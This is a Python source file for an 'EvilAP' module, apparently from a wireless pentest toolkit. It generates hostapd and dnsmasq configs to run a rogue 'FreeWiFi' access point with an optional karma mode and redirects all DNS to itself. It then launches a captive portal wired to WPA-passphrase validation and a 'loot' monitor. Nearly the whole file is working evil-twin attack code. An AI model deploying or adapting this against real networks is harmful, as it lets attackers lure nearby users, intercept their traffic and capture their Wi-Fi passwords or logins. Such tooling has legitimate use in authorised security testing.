import subprocess
import os
import logging
import time
import threading
import json

from logger import Logger
logger = Logger(name="evil_ap.py", level=logging.DEBUG)
b_class = "EvilAP"
b_module = "evil_ap"
b_status = "evil_ap"
b_port = 0
b_parent = None


class EvilAP:
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.interface = shared_data.config.get("evil_ap_interface", "wlan0")
        self.running = False
        self.hostapd_process = None
        self.dnsmasq_process = None
        self.captive_portal_process = None
        self.config_dir = os.path.join(shared_data.currentdir, 'config')
        self.hostapd_conf = os.path.join(self.config_dir, 'hostapd.conf')
        self.dnsmasq_conf = os.path.join(self.config_dir, 'dnsmasq.conf')
        self.portal_template = "generic.html"
        self.wpa_validate_enabled = False
        self.wpa_interface = ""
        self.wpa_validator = None
        self.karma_enabled = False
        self.karma_interface = ""
        self.loot_monitor = None
        self.ssid = "FreeWiFi"

    def generate_hostapd_conf(self, ssid, channel=6, wpa_passphrase=None, karma=False):
        config = (
            f"interface={self.interface}\n"
            f"driver=nl80211\n"
            f"ssid={ssid}\n"
            f"hw_mode=g\n"
            f"channel={channel}\n"
            f"macaddr_acl=0\n"
            f"auth_algs=1\n"
            f"ignore_broadcast_ssid=0\n"
        )
        if karma:
            config += (
                f"accept_mac_file=/dev/null\n"
                f"ap_isolate=0\n"
            )
        if wpa_passphrase:
            config += (
                f"wpa=2\n"
                f"wpa_passphrase={wpa_passphrase}\n"
                f"wpa_key_mgmt=WPA-PSK\n"
                f"wpa_pairwise=TKIP\n"
                f"rsn_pairwise=CCMP\n"
            )
        else:
            config += "wpa=0\n"
        with open(self.hostapd_conf, 'w') as f:
            f.write(config)
        logger.info(f"hostapd config generated for SSID: {ssid} (karma={karma})")

    def generate_dnsmasq_conf(self):
        config = (
            f"interface={self.interface}\n"
            f"dhcp-range=192.168.5.2,192.168.5.100,255.255.255.0,24h\n"
            f"dhcp-option=3,192.168.5.1\n"
            f"dhcp-option=6,192.168.5.1\n"
            f"address=/#/192.168.5.1\n"
            f"server=8.8.8.8\n"
            f"log-queries\n"
            f"log-dhcp\n"
        )
        with open(self.dnsmasq_conf, 'w') as f:
            f.write(config)
        logger.info("dnsmasq config generated")

    def start(self, ssid="FreeWiFi", channel=6, wpa_passphrase=None,
              portal_template="generic.html",
              wpa_validate_enabled=False, wpa_interface="",
              wpa_validator=None, karma_enabled=False, karma_interface="",
              loot_monitor=None):
        try:
            self.ssid = ssid
            self.portal_template = portal_template
            self.wpa_validate_enabled = wpa_validate_enabled
            self.wpa_interface = wpa_interface or self.interface
            self.wpa_validator = wpa_validator
            self.karma_enabled = karma_enabled
            self.karma_interface = karma_interface or self.interface
            self.loot_monitor = loot_monitor

            if self.shared_data.config.get("enable_monitor_mode", False):
                mon = self.shared_data.monitor_instance
                if mon:
                    mon.stop_monitor()
                self.shared_data.config["enable_monitor_mode"] = False
                logger.info("Disabled monitor mode before starting Evil AP")

            portal = self.shared_data.captive_portal_instance
            if portal:
                portal.stop()
                self.shared_data.captive_portal_instance = None

            self.generate_hostapd_conf(ssid, channel, wpa_passphrase, karma_enabled)
            self.generate_dnsmasq_conf()

            subprocess.run(['sudo', 'ip', 'addr', 'add', '192.168.5.1/24', 'dev', self.interface], capture_output=True, check=False)
            subprocess.run(['sudo', 'ip', 'link', 'set', self.interface, 'up'], capture_output=True, check=False)

            self.hostapd_process = subprocess.Popen(
                ['sudo', 'hostapd', self.hostapd_conf],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            time.sleep(2)
            if self.hostapd_process.poll() is not None:
                logger.error("hostapd failed to start")
                self.stop()
                return False

            self.dnsmasq_process = subprocess.Popen(
                ['sudo', 'dnsmasq', '-C', self.dnsmasq_conf, '--no-daemon'],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )

            new_portal = self.shared_data.captive_portal_class(self.shared_data)
            new_portal.start(
                port=80, portal_template=portal_template,
                wpa_validate_enabled=wpa_validate_enabled,
                wpa_interface=self.wpa_interface,
                wpa_validator=wpa_validator,
                loot_monitor=loot_monitor,
                ssid=ssid,
                evil_ap_instance=self
            )
            self.shared_data.captive_portal_instance = new_portal

            self.running = True
            self.shared_data.config["evil_ap_running"] = True
            logger.info(f"Evil AP started: SSID={ssid}, Channel={channel}, portal={portal_template}, karma={karma_enabled}, wpa={wpa_validate_enabled}")
            return True
        except Exception as e:
            logger.error(f"Failed to start Evil AP: {e}")
            self.stop()
            return False

    def stop(self):
        for proc, name in [(self.hostapd_process, 'hostapd'), (self.dnsmasq_process, 'dnsmasq')]:
            if proc:
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except:
                    proc.kill()
        subprocess.run(['sudo', 'pkill', '-x', 'hostapd'], capture_output=True)
        subprocess.run(['sudo', 'ip', 'addr', 'del', '192.168.5.1/24', 'dev', self.interface], capture_output=True, check=False)
        portal = self.shared_data.captive_portal_instance
        if portal:
            portal.stop()
            self.shared_data.captive_portal_instance = None
        self.hostapd_process = None
        self.dnsmasq_process = None
        self.running = False
        self.shared_data.config["evil_ap_running"] = False
        logger.info("Evil AP stopped")

    def restart(self):
        logger.info("Restarting Evil AP...")
        self.stop()
        time.sleep(2)
        self.start(
            ssid=self.ssid, channel=6, wpa_passphrase=None,
            portal_template=self.portal_template,
            wpa_validate_enabled=self.wpa_validate_enabled,
            wpa_interface=self.wpa_interface,
            wpa_validator=self.wpa_validator,
            karma_enabled=self.karma_enabled,
            karma_interface=self.karma_interface,
            loot_monitor=self.loot_monitor
        )

    def get_status(self):
        alive = self.running
        if alive and self.hostapd_process:
            alive = self.hostapd_process.poll() is None
        return {"running": alive}

    def execute(self, ip="", port="", row=None, status_key=""):
        return 'success'
